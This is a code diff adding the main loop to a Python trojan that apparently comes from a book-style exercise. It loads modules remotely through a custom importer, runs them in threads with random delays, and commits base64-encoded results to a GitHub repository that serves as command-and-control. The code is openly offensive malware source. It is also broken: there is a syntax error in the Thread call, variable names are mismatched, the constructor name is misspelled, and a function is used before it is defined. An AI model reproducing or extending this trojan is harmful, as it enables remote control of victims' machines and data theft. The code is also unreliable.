@@ -17,6 +17,26 @@ trojan_modules = []
 configured = false 
 task.queue = Queue.Queue()
 
+#main loop
+sys.meta_path = [GitImporter()]
+while True:
+	if task_queue.empty():
+		config = get_trojan_config()
+		for task in config:
+			t = threading.Thread(target=module_runner.args=(task['module'],))
+			t.start()
+			time.sleep(random.randint(1,10))
+time.sleep(random.randint(1000,10000))
+
+
+def module_runner(module):
+	task_queue.put(1)
+	result = sys.modules[module].run()
+	task_queue.get()
+	
+	store_module_result(result)
+	return
+
 def connect_to_github():
 	gh =login(username="yourusername",password="yourpassword")
 	repo = github.repository("navis-cs","chapter7")
@@ -51,6 +71,7 @@ def store_module_result(data):
 	repo.create_file(remote_path,"Commit message",base64.b64encode(data))
 	
 	return
+
 
 class GitImporter(object):
 	def _init_(self):
